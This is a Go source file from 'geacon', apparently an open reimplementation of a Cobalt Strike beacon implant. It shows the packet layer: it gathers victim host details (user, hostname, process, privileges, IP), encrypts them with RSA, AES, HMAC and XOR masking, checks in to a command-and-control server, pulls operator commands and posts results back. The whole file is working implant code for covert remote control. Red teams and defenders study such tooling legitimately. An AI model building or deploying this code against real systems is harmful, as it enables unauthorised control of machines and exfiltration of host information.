package packet

import (
	"bytes"
	"crypto/sha256"
	"crypto/hmac"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/sysinfo"
	"geacon/cmd/util"
	"strconv"
	"strings"
	"time"
	"math/rand"

	"github.com/imroc/req"
)

var (
	encryptedMetaInfo string
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func WriteLittleInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func ReadLittleInt(b []byte) uint32 {
	return binary.LittleEndian.Uint32(b)
}


func ReadShort(b []byte) uint16 {
	return binary.BigEndian.Uint16(b)
}

func ProfileDecryptPacket(b []byte) []byte {
	// first base64decode, then unmask
	xored := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).DecodedLen(len(b)))
	_, err := base64.URLEncoding.WithPadding(base64.NoPadding).Decode(xored, b)
	if err != nil {
		fmt.Println("decode error:", err)
	}
	// xored, err := base64.URLEncoding.DecodeString(string(b))
	fmt.Printf("Length of xored data: %d\n", len(xored))
	fmt.Printf("xored data: %v\n", xored)

	decrypted := unmask(xored)

	fmt.Printf("Length of decoded data: %d\n", len(decrypted))
	fmt.Printf("%v\n", decrypted)

	return decrypted
}

func DecryptPacket(b []byte) ([]byte, bool) {

	hmacVerfied := false

	decrypted := ProfileDecryptPacket(b)

	// if the data length is greater than 0, then we received a command!
	// Otherwise, it is just an acceptance of our checkin request, and as such does not contain a command nor an HMAC
	if len(decrypted) > 0 {
			// last 16 Bytes are the HMAC 
		// hmacHash := decrypted[:len(decrypted)-crypt.HmacHashLen]
		hmacHash := decrypted[len(decrypted)-crypt.HmacHashLen:]

		fmt.Printf("hmac hash: %v\n", hmacHash)
		// restBytes := decrypted[len(decrypted)-crypt.HmacHashLen:]
		restBytes := decrypted[:len(decrypted)-crypt.HmacHashLen]
		fmt.Printf("%v\n", restBytes)

		//TODO check the hmachash
		if validMac(restBytes, hmacHash, config.HmacKey) == true {
			fmt.Printf("HMAC correct\n")
			hmacVerfied = true
		} else {
			fmt.Printf("HMAC incorrect\n")
		}

		aesDecrypted, err := crypt.AesCBCDecrypt(restBytes, config.AesKey)

		if err != nil {
			panic(err)
		}

		return aesDecrypted, hmacVerfied
	} else {
		fmt.Printf("decrypted length is zero\n")
		return nil, hmacVerfied
	}
}

func validMac(message, messageMAC, key []byte) bool {
	mac := hmac.New(sha256.New, key)
	mac.Write(message)
	expectedMAC := mac.Sum(nil)[0:16]
	fmt.Printf("Expected HMAC: %v\n Message HMAC: %v\n", expectedMAC, messageMAC)
	fmt.Printf("HMAC Key: %v\n", config.HmacKey)
	return hmac.Equal(messageMAC, expectedMAC)
}

func EncryptPacket(b []byte) []byte {
	fmt.Printf("Packet before encryption:\n %v \n", b)
	masked := mask(b)
	encrypted := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).EncodedLen(len(masked)))
	base64.URLEncoding.WithPadding(base64.NoPadding).Encode(encrypted, masked)
	fmt.Printf("Packet after encryption:\n %s \n", string(encrypted))
	return encrypted
}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	fmt.Printf("Reading Command Type Bytes...\n")
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	fmt.Printf("Reading Command Len Bytes...\n")
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Reading Command Bytes...\n")
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)
	return commandType, commandBuf

}

func MakePacket(replyType int, b []byte) []byte {
	config.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(config.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := crypt.AesCBCEncrypt(buf.Bytes(), config.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + crypt.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := crypt.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return EncryptPacket(buf.Bytes())

}

func EncryptedMetaInfo() string {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
	if err != nil {
		panic(err)
	}

	//TODO c2profile encode method
	finalPacket := string(EncryptPacket(packetEncrypted))
	return finalPacket
}

// func DecryptedMetaInfo(encryptedMetaInfo []byte) []byte {
// 	metaDataUnencrpyted, err := crypt.RsaDecryptPrivate(encryptedMetaInfo)
// 	if err != nil {
// 		panic (err)
// 	}
// 	return metaDataUnencrpyted
// }

/*
MetaData for 4.1
	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
func MakeMetaInfo() []byte {
	crypt.RandomAESKey()
	sha256hash := sha256.Sum256(config.GlobalKey)
	config.AesKey = sha256hash[:16]
	config.HmacKey = sha256hash[16:]
	fmt.Printf("AES KEY: %v\n", config.AesKey)
	fmt.Printf("HMAC KEY: %v\n", config.HmacKey)

	clientID = sysinfo.GeaconID()
	processID := sysinfo.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := sysinfo.GetMetaDataFlag()
	//for OS Version
	osVersion := sysinfo.GetOSVersion()
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}


	//for Smart Inject, will not be implemented
	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser := sysinfo.GetUsername()

	localeANSI := sysinfo.GetCodePageANSI()
	localeOEM := sysinfo.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = byte(metadataFlag)
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	osInfoBytes := []byte(osInfo)

	fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := sysinfo.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func FirstBlood() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		resp := HttpGet(config.GetUrl, encryptedMetaInfo)
		if resp != nil {
			fmt.Printf("firstblood: %v\n", resp)
			fmt.Printf("firstblood body: %x\n", resp.Bytes())
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(config.WaitTime)
	return true
}

func PullCommand() *req.Resp {
	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedMetaInfo)
	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
	fmt.Printf("%v \n", resp)
	return resp
}

func PullChainCommand(encryptedChainMetaInfo []byte) *req.Resp {
	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedChainMetaInfo)
	resp := HttpGet(config.GetUrl, string(EncryptPacket(encryptedChainMetaInfo)))
	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
	fmt.Printf("%v \n", resp)
	return resp
}

func PushResult(b []byte) *req.Resp {
	// url := config.PostUrl + strconv.Itoa(clientID)
	maskedClientID := mask([]byte(strconv.Itoa(clientID)))
	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
	resp := HttpPost(url, b)
	fmt.Printf("pushresult: %v\n", resp.Request().URL)
	return resp
}

func PushChainResult(chainClientId int, b []byte) *req.Resp {
	// url := config.PostUrl + strconv.Itoa(clientID)
	maskedClientID := mask([]byte(strconv.Itoa(chainClientId)))
	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
	resp := HttpPost(url, b)
	fmt.Printf("pushresult: %v\n", resp.Request().URL)
	return resp
}

/*
func processError(err string) {
	errIdBytes := WriteInt(0) // must be zero
	arg1Bytes := WriteInt(0)  // for debug
	arg2Bytes := WriteInt(0)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	finalPaket := MakePacket(31, result)
	PushResult(finalPaket)
}
*/

func mask(b []byte) []byte {
	key := make([]byte, 4)
    rand.Read(key)
	data := make([]byte, len(b))
	// fmt.Printf("Length of key is %d \nLength of data is %d \n", len(key), len(b))

	for i := 0; i < len(b); i++ {
		xorPos := i % len(key)
		// fmt.Printf("i IS: %d \nXOR POSITION IS: %d %% %d = %d \n", i, i, len(key), xorPos)
		xorKey := key[xorPos]
		data[i] = b[i] ^ xorKey
		// fmt.Printf("Data before encoding: %v \nData after encoding: %v \n", b[i], data[i])
	}

	// fmt.Printf("Data masked: %x \n", data)

	result := make([]byte, len(key) + len(data))
	result = append(key, data...)
	return result
}

func unmask(b []byte) []byte {
	fmt.Printf("Data to unmask: %v \n", b)
	// CS mask directive prepends 4 bytes of random data as a XOR key to the encoded data. To get the data as we want it, we need to decode it.
	// first 4 bytes of data are our key, rest is the data
	fmt.Printf("Length of b   : %d\nLength of key : %d\nLength of data: %d\n", len(b), len(b[:4]), len(b[4:]))
	key := b[:4]
	data := b[4:]
	// XOR the data with the key
	result := make([]byte, len(data)) // create a new slice with the same length as our data (original byte slice length - key length)

	// fmt.Printf("Length of data is %d\n", len(data))

	for i := 0; i < len(data); i++ {
		xorPos := i % len(key)
		// fmt.Printf("i IS: %d \nXOR POSITION IS: %d %% %d = %d \n", i, i, len(key), xorPos)
		xorKey := key[xorPos]
		result[i] = data[i] ^ xorKey
		// fmt.Printf("Data before encoding: %v \nData after encoding: %v \n", data[i], result[i])
	}
	return result
}
